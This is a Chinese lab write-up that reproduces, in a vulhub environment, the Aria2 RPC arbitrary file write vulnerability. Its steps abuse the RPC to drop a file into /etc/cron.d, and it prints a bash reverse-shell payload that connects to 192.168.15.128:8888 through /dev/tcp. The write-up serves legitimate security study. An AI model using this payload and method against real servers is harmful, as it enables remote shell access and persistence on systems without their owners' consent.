## Aria2任意文件写入漏洞

###### by ADummy

### 0x00利用路线

​			第三方UI与目标进行通信--->搭建http服务器--->让目标下载恶意文件--->定时任务执行--->反弹shell

### 0x01漏洞介绍

​			Aria2是一个轻量级，多协议，多源下载工具（支持HTTP / HTTPS，FTP，BitTorrent，Metalink），内置XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。通过控制文件下载链接，文件储存路径以及文件名，可以实现任意文件写入。同时通过Aria2提供的其他功能，诸如save-session等也能轻易地实现任意文件写入指定功能

### 0x02漏洞复现

##### **PAYLOAD:

```
#! /bin/bash
/bin/bash -i >& /dev/tcp/192.168.15.128/8888 0>&1
```

​			**6800是aria2的rpc服务的默认端口，环境启动后，访问http://your-ip:6800/，看到一个空白页面，通过bp抓包可以看到返回了404，说明服务已启动**

![Aria2任意文件写入漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_1.jpg)

​			**由于rpc通信需要json或xml，因此不方便，因此我们可以使用第三方UI与目标进行通信，例如http://binux.github.io/yaaw/demo/**

​			**打开yaaw，单击配置按钮，然后填写运行aria2：的目标域名`http://your-ip:6800/jsonrpc`**

![Aria2任意文件写入漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_2.jpg)

​			**python创建一个简单的服务器。**

Python2 ：python2 -m SimpleHTTPServer 8000
Python3 ：python3 -m http.server 8000

![Aria2任意文件写入漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_3.jpg)

![Aria2任意文件写入漏洞_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_4.jpg)

​			**搭建成功后访问一下，可以看到写好的shell文件**

![Aria2任意文件写入漏洞_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_5.jpg)

​			**然后单击“添加+”以添加新的下载任务。在“目录”（Dir）字段中填写要下载文件的目录，并在“文件名”（File Name）字段中填写所需的文件名。例如，我们将通过编写crond任务来下载反向shell程序**

![Aria2任意文件写入漏洞_6](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_6.jpg)

​			**此时，arai2会将恶意文件（您指定的URL）下载到/etc/cron.d/目录中，文件名为“ shell”。在debian中，/ etc / cron.d目录中的所有文件都将作为计划任务配置文件（如crontab）读取。编写完成后，我们必须等待一分钟才能执行反向Shell脚本**



#### 此处环境有问题，等了很久都没反弹到shell，看人家说是1分钟左右，于是找了下原因，在这篇博客中https://www.cnblogs.com/foe0/p/11353506.html博主就说了大概率是靶场环境不完整导致的。既然他定时任务动不了，那我自己动手不过分吧

![](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_7.jpg)

![Aria2任意文件写入漏洞_8](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Aria2任意文件写入漏洞_8.jpg)

```
如果反向Shell不成功，请注意crontab文件的格式，并且换行符必须为`\n`，并且文件末尾需要换行符
```



### 0x03参考资料

https://www.dtmao.cc/news_show_469672.shtml

其他利用方法:https://paper.seebug.org/120/



